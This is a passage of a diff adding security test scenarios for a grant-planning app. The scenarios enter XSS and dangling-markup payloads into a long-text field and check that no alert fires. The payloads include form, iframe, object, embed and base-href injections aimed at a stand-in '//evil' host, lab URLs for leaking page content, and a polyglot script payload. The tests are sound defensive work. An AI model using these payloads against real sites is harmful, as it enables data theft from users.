+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                        | Field                          |
+      | <form><button style="width:100%;height:100%" type=submit formaction="//evil? | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307206 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                               | Field                          |
+      | <form><input type=submit value="XSS" style="width:100%;height:100%" type=submit formaction="//evil? | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307211 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                     | Field                          |
+      | <button form=x style="width:100%;height:100%;"><form id=x action="//evil? | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307213 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                 | Field                          |
+      | <object data="//evil? | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307214 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                | Field                          |
+      | <iframe src="//evil? | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307215 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value               | Field                          |
+      | <embed src="//evil? | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307216 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                         | Field                          |
+      | <form><button formaction=//evil>XSS</button><textarea name=x> | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307219 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                         | Field                          |
+      | S<button form=x>XSS</button><form id=x action=//evil target=' | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307221 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                                                        | Field                          |
+      | <a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target=" | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307224 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                                              | Field                          |
+      | <form><input type=submit value="Click me" formaction=http://subdomain1.portswigger-labs.net/dangling_markup/name.html formtarget=" | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307229 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                 | Field                          |
+      | <a href=abc style="width:100%;height:100%;position:absolute;font-size:1000px;">xss<base href="//evil/ | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307230 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                              | Field                          |
+      | <embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=" | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307231 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                               | Field                          |
+      | <iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=" | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307233 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                | Field                          |
+      | <object data=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=" | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307235 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                        | Field                          |
+      | <frameset><frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=" | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307236 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                      | Field                          |
+      | <input type=hidden type=image src="//evil? | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307238 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                            | Field                          |
+      | javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'> | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307239 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
